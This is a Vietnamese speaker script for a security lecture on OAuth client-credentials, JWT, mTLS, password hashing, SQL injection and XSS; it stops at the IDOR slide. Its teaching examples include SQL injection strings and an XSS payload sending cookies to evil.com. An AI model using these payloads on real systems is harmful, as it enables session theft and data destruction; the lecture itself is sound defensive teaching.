# Kịch bản trình bày — Section 4 · 5 · 6 (Khanh)

**Người trình bày:** Khanh · **Thời lượng:** ~27 phút (11 + 9 + 7)
**Vị trí:** Nối tiếp ngay sau phần OIDC + Session/MFA đã trình bày hôm trước.

> ⚠️ OIDC đã được nói kỹ rồi → trong Section 6, phần OIDC **đã được gỡ bỏ**. Giờ Section 6 chỉ còn **CSRF + RBAC/ABAC**. Nếu khán giả hỏi OIDC, chỉ cần nhắc lại 1 câu và trỏ về phần cũ.

> **Cách dùng file này:**
> - **📖 HIỂU SÂU** = phần đọc để hiểu kỹ (học ở nhà, KHÔNG đọc nguyên văn khi present).
> - **NÓI** = lời thoại, đọc gần như nguyên văn khi đứng nói.
> - **CHỈ** = chỉ tay vào đâu trên màn hình · **CHUYỂN Ý** = câu nối · **In đậm** = câu chốt, nói chậm + rõ.

---

## MỞ ĐẦU TOÀN PHẦN (~20 giây)

**NÓI:**
- "Phần trước mình đã nói **danh tính của con người** — đăng nhập, session, MFA, OIDC. Ba phần tiếp theo mình đi xuống tầng sâu hơn: **(1)** khi không còn con người nào cả — service tự xác thực với service; **(2)** những lỗ hổng bảo mật kinh điển phải tránh; **(3)** ba mảnh ghép hay bị bỏ quên: CSRF và mô hình phân quyền RBAC/ABAC."

---

# ════════════════════════════════════════
# SECTION 4 — SERVICE-TO-SERVICE AUTH (~11 phút)
# ════════════════════════════════════════

## PHẦN A — Kiến thức nền PHẢI nắm cứng

**5 ý cốt lõi:**

1. **Vấn đề:** Traffic nội bộ giữa các microservice là **east-west, tự động, không có session người dùng**. Không thể hỏi "user là ai". Câu hỏi đổi thành: **"service nào đang gọi, và nó được phép làm gì?"**

2. **Anti-pattern chí mạng:** *"API nội bộ = API tin được."* Sai. **Ranh giới mạng chỉ kiểm soát "ai chạm tới được", không kiểm soát "ai là ai".**

3. **Lời giải — Client Credentials grant:** Service "đăng nhập như chính nó" bằng `client_id` + `client_secret` (username/password của **app**), nhận về **access token ngắn hạn (JWT)**. Không redirect, không browser, vì không có user.

4. **JWT cho M2M — Service B validate LOCAL (stateless):** `sub` (service gọi) · `iss` (Auth Server) · `aud` (service nhận) · `exp` (5–15 phút) · `scope` (quyền). Service B kiểm chữ ký bằng **JWKS**, không gọi ngược Auth Server mỗi request.

5. **Validation ≠ Authorization (2 việc, cả hai phải pass):** Validation = "token thật & cho tôi không?" (chữ ký/`exp`/`iss`/`aud`) · Authorization = "caller được làm gì?" (`scope` → endpoint, least privilege).

**Mental model vàng (nói thuộc lòng):**
> **OAuth 2.0 nói *cách lấy token* · JWT nói *token trông như thế nào* · policy của Service B nói *caller được làm gì*.**

> 📖 **HIỂU SÂU — vì sao M2M khác hẳn login người dùng?**
> Khi user đăng nhập, mình có thể bắt họ gõ mật khẩu, bấm OTP, mở browser redirect. Còn service thì **chạy tự động lúc 3h sáng, không có màn hình, không có ngón tay nào bấm nút**. Nên mọi cơ chế dựa vào "con người tương tác" đều vô dụng. M2M cần một cách để service **tự chứng minh danh tính bằng credential nó tự giữ**, và cách đó phải **không cần con người** trong vòng lặp. Đó chính là lý do Client Credentials tồn tại: nó là grant OAuth duy nhất **không có bước user đồng ý / redirect**.

---

## PHẦN B — Kịch bản từng slide

### SLIDE 4.1 — "Who Is the Caller?" (vấn đề) `~1.5 phút`
**MÀN HÌNH:** prose vấn đề + sơ đồ "compromised pod" gọi thẳng Payments.

**NÓI:**
- "Đây là bài toán: Service A gọi Service B, **không có user nào đăng nhập cả**. Service B vẫn phải biết *ai đang gọi* và *được làm gì*."
- "Traffic nội bộ có 3 đặc điểm: **east-west** (service tới service), **tự động** (không ai bấm nút), **sessionless** (không có phiên đăng nhập)."
- **CHỈ vào pod đỏ:** "Nếu Service B tin 'cứ trong cluster là tin được', thì **một pod bị chiếm là gọi thẳng được Payments**."
- **Câu chốt (nói chậm):** "**Ranh giới mạng kiểm soát *chạm tới được*, không kiểm soát *là ai*.** Đây là tư duy zero-trust."

> 📖 **HIỂU SÂU — "east-west" và vì sao network boundary không đủ:**
> - **North-south** = traffic ra/vào hệ thống (user ↔ hệ thống). **East-west** = traffic *bên trong* hệ thống (service ↔ service). Microservice tạo ra cực nhiều traffic east-west.
> - Mô hình cũ ("castle-and-moat"): dựng tường lửa quanh cluster, **bên trong tin nhau hết**. Vấn đề: chỉ cần **một** lỗ (một pod dính RCE, một dependency độc, một config sai) → kẻ tấn công vào được *bên trong* và **đi ngang tự do** tới Payments, Database... vì mọi thứ bên trong tin nhau.
> - **Zero-trust** đảo ngược: *"không tin ai theo vị trí — kể cả bên trong cluster."* Mỗi cuộc gọi phải **tự chứng minh danh tính**, bất kể nó đến từ đâu. Đó là lý do ta cần token/cert cho từng request, không dựa vào "nó nằm trong mạng nội bộ".

**CHUYỂN Ý:** "Vậy sửa thế nào? Đặt một Auth Server vào giữa."

### SLIDE 4.2 — "Auth Server Issues the Tokens" (kiến trúc nền) `~2 phút`
**MÀN HÌNH:** 3 vai (Service A / Auth Server / Service B) + sơ đồ 5 bước (kèm JWKS).

**NÓI:**
- "Lời giải: **không ai được tin theo vị trí — ai cũng phải cầm token do Auth Server phát.**"
- **CHỈ 3 vai:** "**Service A** là caller. **Auth Server** xác minh và phát token. **Service B** validate token rồi phục vụ."
- **CHỈ sơ đồ, nhấn mạnh AI LOGIN:** "Để ý: **chỉ Service A — bên *gọi* — mới login** (bước 1: gửi `client_id + secret`) để **lấy token** (bước 2). **Service B — bên *kiểm* — KHÔNG login.**"
- **CHỈ nhánh JWKS (đường nét đứt):** "Auth Server publish **public key** ở `jwks.json` — endpoint **công khai, không cần đăng nhập**. Service B chỉ **tải về một lần rồi cache** (bước 3)."
- **CHỈ bước 4–5:** "A gọi B kèm `Authorization: Bearer` (bước 4). B **kiểm chữ ký *local* bằng key đã cache** (bước 5) — **không gọi ngược về Auth Server mỗi request.**"
- **Câu chốt:** "**Chỉ bên gọi mới login để lấy token; bên kiểm chỉ tải public key rồi verify local.** Đó là cái hay của JWT stateless — không nghẽn ở Auth Server."

> 📖 **HIỂU SÂU — 3 vai và vì sao "verify local" là điểm mấu chốt:**
> - **3 vai** đúng theo OAuth: **Client** (Service A — bên xin & dùng token), **Authorization Server** (bên phát token), **Resource Server** (Service B — bên giữ tài nguyên & kiểm token).
> - **Vì sao verify local quan trọng?** Hình dung 1000 request/giây tới Service B. Nếu mỗi request B phải **gọi ngược Auth Server** hỏi "token này còn hợp lệ không?" → Auth Server thành **nút thắt cổ chai**, và nếu Auth Server chết thì cả hệ thống chết theo. JWT giải quyết: token **tự chứa** (self-contained) + **có chữ ký**. B chỉ cần **public key** (lấy 1 lần từ JWKS) là **tự kiểm offline**, không hỏi ai. Đánh đổi: token đã phát thì **khó thu hồi giữa chừng** → nên đặt `exp` ngắn.
> - **Khóa bất đối xứng (asymmetric):** Auth Server ký bằng **private key** (bí mật, chỉ nó giữ). Ai cũng kiểm được bằng **public key** (công khai). Vì kiểm ≠ ký, **đưa public key cho cả thế giới cũng không ai giả được chữ ký.** Đó là lý do JWKS để công khai mà vẫn an toàn.

**CHUYỂN Ý:** "Service 'đăng nhập' kiểu gì khi không có người? Đó là Client Credentials."

### SLIDE 4.3 — "How a Service Logs In as Itself" (Client Credentials) `~2 phút`
**MÀN HÌNH:** prose + ví dụ `POST /oauth/token` + sơ đồ 3 cổng (active? → secret? → scope?).

**NÓI:**
- "Client Credentials = service **đăng nhập như chính nó**. Nó giữ `client_id` + `client_secret` — **username/password của app, không phải của người**."
- **CHỈ đoạn POST:** "Nó gửi id + secret + `scope` muốn xin tới token endpoint, nhận về **access token ngắn hạn**."
- **CHỈ 3 cổng:** "Auth Server kiểm 3 cổng: **client còn active không → secret đúng không (kiểm bằng bcrypt) → scope có được cấp không**. Sai bất kỳ cái nào là từ chối."
- **Lưu ý nhỏ:** "Lỗi luôn trả mơ hồ `invalid_client` để **chặn dò client-id**."
- **Câu chốt:** "**Đưa secret vào, nhận token có scope ra.** Nhờ vậy Service B *không bao giờ phải kiểm secret* — nó chỉ kiểm một token tự chứa, ngắn hạn."

> 📖 **HIỂU SÂU — vì sao phải "đổi secret lấy token"?**
> - Tại sao không để Service A gửi thẳng `client_secret` cho Service B mỗi lần gọi? Vì như vậy **secret bị phơi ra khắp nơi** — mọi service nhận secret đều phải biết cách kiểm nó, secret đi qua nhiều chặng mạng, dễ lộ. Thay vào đó, secret **chỉ trao cho Auth Server một chỗ duy nhất**; đổi lấy một **token ngắn hạn** để mang đi khắp nơi. Lộ token thì cũng chỉ thiệt 5–15 phút.
> - **`bcrypt.verify`:** Auth Server **không lưu secret dạng thô** — nó lưu bản hash (bcrypt). Khi A gửi secret, nó hash lại rồi so. Lộ DB Auth Server cũng không lấy được secret gốc. (Liên hệ thẳng Section 5 — hashing.)
> - **Vì sao lỗi mơ hồ `invalid_client`?** Nếu báo rõ "client_id không tồn tại" vs "secret sai", kẻ tấn công sẽ **dò ra danh sách client_id hợp lệ** rồi mới tập trung bẻ secret. Trả lời mơ hồ như nhau cho cả hai ca → bịt kênh dò.
> - **Đời thường:** `client_secret` giống **thẻ ra vào toà nhà** của một phòng ban (không phải của cá nhân). Quẹt thẻ ở quầy lễ tân (Auth Server) → nhận **vé khách 15 phút** (token) để đi vào các phòng (services). Các phòng chỉ kiểm vé, không kiểm thẻ gốc.

**CHUYỂN Ý:** "Token đó nên chứa gì?"

### SLIDE 4.4 — "What the Token Should Contain" (JWT claims) `~1.5 phút`
**MÀN HÌNH:** danh sách claim `sub/iss/aud/exp/scope` + callout.

**NÓI:**
- **CHỈ từng claim:** "`sub` = service nào gọi · `iss` = Auth Server của mình · `aud` = service nào được nhận · `exp` = hết hạn 5–15 phút · `scope` = quyền."
- "Đây đúng là những gì Service B đọc mỗi request: **danh tính (`sub`), độ tin (`iss`/`aud`), độ tươi (`exp`), quyền (`scope`).**"
- **Câu chốt (cảnh báo, nói chậm):** "**Để hint phân quyền (scope/role) vào token — nhưng TUYỆT ĐỐI không để secret hay PII.** Ai chặn được JWT là đọc được payload — **Base64 là encoding, không phải mã hóa.**"

> 📖 **HIỂU SÂU — JWT trông như thế nào & vì sao "Base64 không phải mã hóa":**
> - JWT có **3 phần** cách nhau dấu chấm: `header.payload.signature`.
>   - **header** = thuật toán ký + `kid` (key nào để kiểm).
>   - **payload** = các claim (`sub`, `aud`, `exp`, `scope`...).
>   - **signature** = chữ ký của (header + payload) bằng private key.
> - Header & payload chỉ là **Base64URL-encode** — tức **ai cũng decode đọc được** (vào jwt.io dán vào là thấy hết). Base64 chỉ là cách "đóng gói cho gọn", **không che giấu gì cả**. → Đừng bao giờ để mật khẩu, số thẻ, PII trong payload.
> - **Vậy chữ ký bảo vệ cái gì?** Không phải bí mật nội dung, mà là **tính toàn vẹn**: nếu ai sửa 1 ký tự trong payload (vd đổi `scope` thành `admin`), chữ ký **không khớp nữa** → Service B từ chối. Tức JWT chống **giả mạo**, không chống **đọc trộm**.
> - Liên hệ: đây chính là demo **JWT Forger** ở lecture trước — sửa claim thì chữ ký vỡ.

**CHUYỂN Ý:** "Service B nhận token rồi quyết định ra sao?"

### SLIDE 4.5 — "How Service B Decides" (validation + authz) `~1.5 phút`
**MÀN HÌNH:** 2 cột Validation/Authorization + sơ đồ scope → endpoint.

**NÓI:**
- "**Hai việc tách biệt, cả hai phải pass.**"
- **CHỈ Validation:** "**'Token thật và dành cho tôi không?'** → kiểm **chữ ký** qua JWKS, `exp`, `iss`, `aud`."
- **CHỈ Authorization:** "**'Caller được làm việc này không?'** → map `scope` sang endpoint, ép **least privilege**."
- **CHỈ sơ đồ:** "Token chỉ mang `orders.read` thì **không bao giờ ghi được** — least privilege gói trong một bức tranh."

> 📖 **HIỂU SÂU — đừng lẫn 2 bước (đây là chỗ hay bị hỏi nhất):**
> - **Validation = AuthN của token** ("token này có thật không, có phải dành cho tôi không"). Nếu bỏ qua: kẻ tấn công đưa token tự chế / token hết hạn / token đúc cho service khác → lọt.
>   - kiểm **chữ ký** (qua JWKS) → token đúng do Auth Server ký.
>   - kiểm **`exp`** → token chưa hết hạn.
>   - kiểm **`iss`** → đúng Auth Server mình tin.
>   - kiểm **`aud`** → token này đúc cho *mình* (không phải service khác).
> - **Authorization = AuthZ** ("ok token thật rồi, nhưng caller này có *quyền* làm việc đang yêu cầu không?").
>   - map `scope` → endpoint: vd `orders.read` chỉ cho `GET /orders/*`; muốn `POST /orders` phải có `orders.write`.
> - **Vì sao tách 2 bước?** Một token **hợp lệ** (pass validation) vẫn có thể **không đủ quyền** (fail authorization). Hai câu hỏi khác nhau hoàn toàn: *"có thật không"* vs *"được phép không"*. Lẫn lộn = lỗ hổng (vd verify chữ ký xong cho làm mọi thứ → privilege escalation).
> - **least privilege** ở đây: cấp token đúng `scope` tối thiểu. Token đọc đơn hàng mà lộ → kẻ xấu cũng **chỉ đọc được**, không xoá/sửa.

**CHUYỂN Ý:** "Client Credentials là mặc định, nhưng không phải lựa chọn duy nhất."

### SLIDE 4.6 — "Beyond Client Credentials" (các phương án khác) `~1.5 phút`
**MÀN HÌNH:** mTLS · service mesh · API keys · private_key_jwt.

**NÓI:**
- "Client Credentials + JWT là **mặc định**, nhưng còn vài cách khác — tất cả đều trả lời cùng câu hỏi: *Service A chứng minh nó là ai bằng cách nào.*"
- "**mTLS (mutual TLS):** danh tính mạnh ở **tầng kết nối** — hai bên cùng trình chứng chỉ, handshake fail nếu cái nào sai/hết hạn. Hợp zero-trust."
- "**Service mesh (Istio/Linkerd):** sidecar tự lo mTLS + xoay vòng cert → **code ứng dụng không cầm credential.**"
- "**API keys:** dễ làm nhất nhưng quản trị yếu (xoay vòng, scope, audit)."
- "**`private_key_jwt`:** client **ký JWT bằng private key** thay vì gửi `client_secret` dùng chung — an toàn hơn cho client nhạy cảm."

> 📖 **HIỂU SÂU — đây là slide hay rối, nắm theo "2 tầng":**
>
> Mọi cách dưới đây đều trả lời *"Service A là ai"*, chỉ khác **chứng minh ở tầng nào** và **an toàn tới đâu**:
> ```
> Tầng ỨNG DỤNG (danh tính nằm trong HTTP request):
>    • Client Credentials + JWT  ← mặc định, đã học
>    • API key
>    • private_key_jwt
> Tầng KẾT NỐI / transport (danh tính nằm trong chính kết nối TLS):
>    • mTLS
>    • Service mesh (tự động hoá mTLS)
> ```
>
> **1) mTLS (mutual TLS).** HTTPS thường: **chỉ server** trình chứng chỉ ("tôi đúng là google"), client ẩn danh. mTLS = **cả hai** cùng trình cert; sai/hết hạn một bên → **kết nối gãy ngay, trước khi gửi byte dữ liệu nào**. Khác JWT ở chỗ: JWT là token *gửi kèm request*; mTLS là danh tính *nằm trong chính kết nối*.
> *Đời thường:* JWT = vào quán rồi mới đưa vé. mTLS = cả hai phải quẹt thẻ ở cửa thì cửa mới mở.
>
> **2) Service mesh.** Làm mTLS thủ công ở mọi service = quản cert, xoay vòng, viết nhiều code, dễ sai. Mesh đặt một **sidecar proxy** kế mỗi service; **sidecar lo toàn bộ mTLS tự động**. App chỉ nói HTTP thường với sidecar của nó; hai sidecar mới dựng kết nối mTLS. → **code app không cầm cert/credential gì cả.**
> *Đời thường:* mỗi service có một **vệ sĩ riêng (sidecar)**; hai vệ sĩ tự kiểm danh tính của nhau, service không phải bận tâm.
>
> **3) API key.** Một chuỗi ngẫu nhiên dài, gửi kèm header, server đối chiếu danh sách. Giống **mật khẩu không bao giờ hết hạn**. Dễ làm nhưng khó scope, khó xoay vòng, khó audit, mặc định không hết hạn. → hợp việc đơn giản / bên thứ ba, không hợp service nội bộ nhạy cảm.
>
> **4) private_key_jwt.** Là biến thể an toàn hơn của Client Credentials. Thường: A gửi `client_secret` — một **mật khẩu dùng chung** (cả A và Auth Server đều biết → lộ DB là lộ secret). private_key_jwt: A **tự ký một JWT bằng private key** ("tôi là A"), Auth Server kiểm bằng **public key** của A. **Private key không bao giờ rời A, không có gì dùng chung.**
> *Đời thường:* `client_secret` = hai người cùng biết một mật khẩu (ai nghe lỏm cũng dùng được). `private_key_jwt` = **chữ ký tay của riêng anh** (chỉ anh ký được, người khác chỉ xác minh được, không giả được).
>
> | Cách | Tầng | Độ an toàn | Khi nào dùng |
> |---|---|---|---|
> | Client Credentials + JWT | App | Tốt | **Mặc định** M2M |
> | private_key_jwt | App | Cao hơn (không secret dùng chung) | Client nhạy cảm |
> | API key | App | Thấp | Đơn giản / bên thứ ba |
> | mTLS | Transport | Cao | Zero-trust |
> | Service mesh | Transport | Cao + dễ vận hành | Nhiều service |

**CHUYỂN Ý:** "Để thấy mTLS chạy thật, xem demo handshake."

### SLIDE 4.7 — DEMO: mTLS Handshake `~1 phút`
**NÓI:** "Cả hai bên trình cert. Mỗi bên kiểm cert bên kia ký bởi CA tin cậy. **Một bên sai cert là handshake gãy — danh tính khóa ngay ở tầng kết nối, trước cả khi có dữ liệu.**"

> 📖 **HIỂU SÂU + CÁCH DEMO:** Bấm chạy handshake, chỉ cho khán giả thấy các bước: client hello → server trình cert → **server đòi client trình cert** (đây là điểm "mutual") → client trình cert → cả hai verify qua CA → kênh mã hoá mở. Nhấn: nếu cert client thiếu/hết hạn/không do CA tin cậy ký → **dừng ngay tại bước verify**, không có dữ liệu nào đi qua. Câu chốt: *"mTLS không hỏi token sau khi kết nối — nó chặn danh tính sai ngay khi mở kết nối."*

### SLIDE 4.8 — "Putting It All Together" (best practices) `~1 phút`
**MÀN HÌNH:** checklist + sơ đồ kiến trúc đầy đủ (Auth layer + Services + Mesh).

**NÓI (đọc nhanh checklist):**
- "**Token ngắn hạn 5–15 phút · luôn kiểm `iss`/`aud`/chữ ký/`exp` · secret trong Vault/KMS không để trong code · xoay vòng credential + signing key · mỗi service một identity riêng · log `jti`/`sub` chứ không log full token.**"
- **Câu chốt:** "**Token identity (client credentials + JWKS) và transport identity (mTLS qua mesh) có thể xếp chồng** trong zero-trust — không loại trừ nhau."

> 📖 **HIỂU SÂU — vì sao "log jti/sub chứ không log full token":** Log thường bị lưu lâu, đẩy lên hệ thống tập trung, nhiều người xem. **Full token = credential sống** — log nó ra = ai đọc log cũng cướp được danh tính. Chỉ log **định danh** (`jti` = id của token, `sub` = service nào) đủ để truy vết mà không phơi credential. (Cùng tinh thần "không log mật khẩu".)

**HANDOFF Section 5:** "Đó là cách máy tin máy. Giờ ta nhìn những lỗ hổng làm sập app trong thực tế."

---

## PHẦN C — Q&A Section 4

- **Vì sao đổi secret lấy token chứ không gửi secret thẳng?** → Để secret chỉ trao cho Auth Server một chỗ; token ngắn hạn mang đi khắp nơi, lộ cũng chỉ thiệt 5–15 phút. Service B không bao giờ phải biết/kiểm secret.
- **Service B có phải login vào Auth Server không?** → **Không.** Chỉ **bên gọi (Service A)** mới login (Client Credentials) để **lấy token**. Bên kiểm (Service B) chỉ **tải public key (JWKS) — công khai, không cần credential — về cache một lần**, rồi **verify token local** mỗi request. Mọi claim (`sub`/`aud`/`scope`) đã nằm sẵn trong JWT; public key chỉ để xác nhận token thật.
- **JWKS (JSON Web Key Set) là gì?** → Danh sách **public key** Auth Server công bố công khai (`/.well-known/jwks.json`). JWT ký bằng **private key** (chỉ Auth Server giữ); Service B fetch **public key** để **kiểm chữ ký** — verify được nhưng không ký giả được. Mỗi key có `kid`; header JWT cũng ghi `kid` → chọn đúng key. **Lợi ích:** Auth Server **xoay vòng key** mà không service nào phải hardcode hay deploy lại. *(Chính là `jwks_uri` ở OIDC, dùng lại cho M2M.)*
- **Least privilege (đặc quyền tối thiểu) là gì?** → Cấp **đúng quyền tối thiểu cần**, không hơn. Token `scope: orders.read` thì lộ cũng chỉ đọc. Mục tiêu: **giảm "blast radius"** — bị chiếm thì thiệt hại bị giới hạn trong quyền được cấp. Áp khắp nơi: scope token, DB user read-only, role RBAC/ABAC, IAM role khóa đúng resource.
- **Sao token ngắn hạn 5–15 phút?** → JWT khó thu hồi giữa chừng (verify local, không hỏi ai); để `exp` ngắn nên lộ cũng hết hạn nhanh, và service xin token mới rất rẻ.
- **mTLS thay được JWT không?** → mTLS chứng minh *danh tính kết nối*, JWT mang *scope/quyền*. Thường **kết hợp**: mTLS cho ai-là-ai, JWT cho được-làm-gì.
- **API key vs Client Credentials?** → API key tĩnh, khó scope/xoay vòng, không hết hạn. Client Credentials cho token ngắn hạn có scope, chuẩn OAuth → governance tốt hơn.
- **`aud` để làm gì?** → Chống token "dùng nhầm chỗ": token đúc cho `service-b` mà gửi tới `service-c` thì `service-c` từ chối vì `aud` sai.
- **Lỡ private key của Auth Server bị lộ thì sao?** → Thảm hoạ — kẻ xấu ký được token giả. Vì vậy private key để trong **KMS/HSM**, **xoay vòng định kỳ**, và JWKS công bố nhiều key (cũ+mới) theo `kid` để xoay vòng không gãy hệ thống.

---

# ════════════════════════════════════════
# SECTION 5 — SECURITY FUNDAMENTALS (~9 phút)
# ════════════════════════════════════════

## PHẦN A — Kiến thức nền PHẢI nắm cứng

1. **CIA triad** — mọi control rốt cuộc bảo vệ 3 thứ: **Confidentiality** (không rò rỉ) · **Integrity** (không bị sửa trộm) · **Availability** (vẫn dùng được). Mọi breach đi cùng một đường: **Vulnerability → Exploit → Impact → mất CIA.**

2. **Hashing ≠ Encryption (đừng lẫn):**
   - **Hashing = một chiều** → cho **password**. Lưu cái *verify được* nhưng *không khôi phục được*. Dùng **bcrypt/Argon2** (cố tình chậm) + **salt** riêng mỗi user.
   - **Encryption = hai chiều** → cho **dữ liệu cần lấy lại**. Dùng **AES-256-GCM**, key trong **KMS/Vault**.
   - ⛔ **KHÔNG dùng MD5/SHA-1/SHA-256 trần cho password** — quá nhanh, GPU bẻ hàng tỉ/giây.

3. **3 lỗ hổng OWASP kinh điển — chung một công thức: *input không tin được chạm tới sink nhạy cảm*:** SQL Injection · XSS · Broken Access Control (IDOR).

4. **4 thói quen cốt lõi:** never trust client input · least privilege · **defense in depth** · secure secrets.

**Câu chốt vàng:**
> **Security = correctness under attack (đúng đắn dưới input thù địch) — secure defaults, xếp lớp.**

---

## PHẦN B — Kịch bản từng slide

### SLIDE 5.1 — "Protect the CIA Triad" `~1.5 phút`
**NÓI:**
- "Mọi biện pháp bảo mật cuối cùng bảo vệ 3 thứ: **Confidentiality** không rò rỉ, **Integrity** không bị sửa trộm, **Availability** vẫn sống."
- **Câu chốt:** "Mọi vụ breach đi cùng một đường: **lỗ hổng → khai thác → tác động → mất CIA. Bắt được lỗ hổng từ đầu là cả ván cờ.**"
- "Và nhớ: **bảo mật không phải 'tính năng thêm' — nó là *correctness dưới input thù địch*.**"

> 📖 **HIỂU SÂU — CIA bằng ví dụ cụ thể:**
> - **Confidentiality (bí mật):** lộ database chứa email/token = vỡ confidentiality. Bảo vệ bằng: mã hoá, phân quyền, không log secret.
> - **Integrity (toàn vẹn):** kẻ xấu sửa số dư tài khoản từ 0 → 1 triệu = vỡ integrity. Bảo vệ bằng: chữ ký (JWT!), kiểm quyền ghi, validation.
> - **Availability (sẵn sàng):** DDoS làm sập web = vỡ availability. Bảo vệ bằng: rate limit, auto-scale, chống cạn tài nguyên.
> - Vì sao đóng khung mọi thứ vào CIA? Để khi thiết kế bất kỳ tính năng nào, tự hỏi: *"cái này có thể làm vỡ C, I, hay A không?"* — đó là tư duy bảo mật.

### SLIDE 5.2 — "One-Way vs Two-Way" (hashing vs encryption) `~2 phút`
**MÀN HÌNH:** sơ đồ hashing (mũi tên không quay lại) vs encryption (hai chiều).

**NÓI:**
- "**Hashing một chiều — dùng cho password.** Lưu thứ *verify được* nhưng *không lấy lại được*. Dùng **bcrypt/Argon2** — cố tình chậm — kèm **salt** riêng mỗi user."
- "**Encryption hai chiều — dùng cho dữ liệu phải lấy lại**: PII, token at-rest, secret trong DB. Dùng **AES-256-GCM**, key trong **KMS/Vault, không để trong code.**"
- **Câu chốt (cảnh báo, nói chậm):** "**Tuyệt đối không dùng MD5/SHA-256 trần cho password — quá nhanh, GPU bẻ hàng tỉ mật khẩu mỗi giây.**"
- **CHỈ sơ đồ:** "Mũi tên nói hết: hash *không quay lại được*, encryption *quay lại được*."

> 📖 **HIỂU SÂU — vì sao password phải hash mà KHÔNG encrypt:**
> - **Hashing một chiều** = từ password → digest thì dễ, nhưng từ digest → password thì *không thể đảo ngược*. Khi user đăng nhập, ta **hash lại** input rồi so với digest đã lưu. Server **không bao giờ cần biết** password gốc → lộ DB cũng không lấy được password.
> - **Nếu encrypt password** thì có key giải mã → ai có key (hoặc lộ key) là lấy lại được toàn bộ password gốc. Sai về nguyên tắc: ta *không cần* khôi phục password, chỉ cần *verify*. → dùng hash.
> - **Vì sao "chậm là tốt"?** Hàm như SHA-256 thiết kế để **nhanh** (cho checksum, ký...). Nhưng với password, nhanh = kẻ tấn công thử được **hàng tỉ lần/giây** trên GPU → dò ra password yếu trong vài giây. **bcrypt/Argon2 cố tình chậm** (gọi là *work factor* / *cost*): mỗi lần hash mất ~100ms → brute-force trở nên **đắt không kham nổi**. Argon2 còn *memory-hard* (tốn RAM) để chặn cả ASIC/GPU.
> - **Salt:** chuỗi ngẫu nhiên **riêng mỗi user**, trộn vào trước khi hash. → hai người cùng password `123456` vẫn ra hash khác nhau → vô hiệu **rainbow table** (bảng tra hash dựng sẵn) và chặn việc bẻ một lần ăn nhiều tài khoản.
> - **Còn encryption (AES) dùng khi nào?** Khi ta **buộc phải lấy lại dữ liệu gốc**: số thẻ để hiển thị 4 số cuối, token bên thứ ba để gọi lại API, PII cần đọc... Khi đó key phải để **KMS/Vault**, tuyệt đối không nhét trong code/repo.

### SLIDE 5.3 — "When Input Becomes Code" (SQL Injection) `~1.5 phút`
**NÓI:**
- "SQLi xảy ra khi **input bị nối thẳng vào câu SQL.**"
- **CHỈ ví dụ:** "Nhập `' OR '1'='1` → trả **mọi user**. Nhập `'; DROP TABLE users; --` → **xóa bảng.**"
- "**Fix: parameterized query / prepared statement** — tham số không bao giờ bị hiểu là code. Cộng thêm: validate tên bảng/cột theo allowlist, DB user least-privilege."
- **Câu chốt:** "Công thức OWASP: **hầu hết tấn công chỉ là 'input không tin được chạm tới một sink nhạy cảm'. Làm sạch ở giữa source và sink.**"

> 📖 **HIỂU SÂU — vì sao parameterized query diệt tận gốc:**
> - **Gốc rễ lỗi:** code và data bị **trộn chung một chuỗi**. Khi ta viết `"SELECT * FROM users WHERE email = '" + input + "'"`, cái `input` được **ghép vào câu lệnh** rồi mới gửi DB parse. Nếu input chứa ký tự SQL (`'`, `--`, `;`), nó **thoát khỏi vùng data và trở thành lệnh**.
>   - `' OR '1'='1` → câu thành `WHERE email = '' OR '1'='1'` → `'1'='1'` luôn đúng → trả mọi dòng.
> - **Parameterized query** tách hẳn: ta gửi DB **câu lệnh có chỗ trống** `WHERE email = ?` **trước**, rồi gửi `input` **riêng** như một *giá trị*. DB đã parse xong cấu trúc lệnh, nên `input` **không bao giờ được hiểu là code** — dù chứa gì cũng chỉ là chuỗi để so sánh. → diệt tận gốc, không phải "lọc ký tự xấu" (vốn dễ sót).
> - **DB user least-privilege:** account mà web dùng nên **chỉ đủ quyền cần** (vd chỉ SELECT/INSERT, không DROP). Lỡ có lỗ thì thiệt hại cũng bị chặn (lại là least privilege).

### SLIDE 5.4 — "Attacker JS Runs in the Victim's Browser" (XSS) `~1.5 phút` + DEMO
**NÓI:**
- "XSS = **JS của attacker chạy trong browser nạn nhân.** Hậu quả: trộm token, hành động thay user."
- "**Fix: output encoding/escaping** (cả server lẫn client), **CSP**, và **đừng để token trong `localStorage`** — XSS đọc sạch mọi thứ ở đó."

> 📖 **HIỂU SÂU — XSS gói trong 3 ý: LÀ GÌ · VÍ DỤ · NGĂN CHẶN**
>
> **① XSS là gì?**
> Kẻ tấn công nhét được **JavaScript của nó vào trang web của bạn**, và trình duyệt nạn nhân **chạy đoạn JS đó như thể là code của trang.** Vì trình duyệt cho code trong trang toàn quyền (đọc cookie, token, gọi API thay user), nên script lạ này cũng có luôn quyền đó.
> *Một câu:* "XSS = chạy được code lạ trong trang của bạn."
>
> **② Ví dụ**
> Ô comment cho user nhập. Kẻ tấn công gõ comment là:
> ```html
> <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
> ```
> Server lưu rồi in **thẳng** ra trang. Từ đó **ai mở trang cũng chạy đoạn script đó** → cookie của họ bị gửi về evil.com → kẻ tấn công chiếm phiên đăng nhập. 💥
>
> **③ Cách ngăn chặn**
> - **Output encoding / escaping (chính):** khi in input ra HTML, đổi `<` → `&lt;`, `>` → `&gt;` → trình duyệt hiện `<script>` thành **chữ vô hại**, không chạy. (React tự làm sẵn; chỉ dính khi dùng `dangerouslySetInnerHTML`.)
> - **CSP:** bảo trình duyệt "chỉ chạy script từ nguồn cho phép" → lọt cũng khó chạy.
> - **Token để cookie `HttpOnly`, không để `localStorage`:** HttpOnly thì JS không đọc được → dính XSS cũng không lấy được token.
>
> **3 lớp chặn ở 3 chỗ (đúng sơ đồ bên phải slide):**
> ```
> Input vào HTML   ──①escaping──►  thành chữ, không là thẻ   (ngăn TRỞ THÀNH script)
> Nếu lọt          ──②CSP──────►  trình duyệt từ chối chạy   (ngăn CHẠY)
> Nếu vẫn chạy     ──③HttpOnly─►  JS không đọc được token    (giảm THIỆT HẠI)
> ```
> *Câu chốt:* "Escaping ngăn payload thành script, CSP ngăn script chạy, HttpOnly ngăn nó cướp token. Không lớp nào hoàn hảo — nên xếp chồng."
>
> **CÁCH DEMO:** bấm sample bên **trái (Unsanitized)** → khung **đỏ + banner "💥 injected script ran"** = script chạy = XSS thật. Bên **phải (Sanitized)** → cùng payload hiện ra dưới dạng **chữ vô hại** = đã escape. Chốt: *"cùng một input — không escape thì script chạy, escape thì chỉ là chữ."*

### SLIDE 5.5 — "Change the ID, Get Someone Else's Data" (Broken Access Control / IDOR) `~1.5 phút`
**NÓI:**
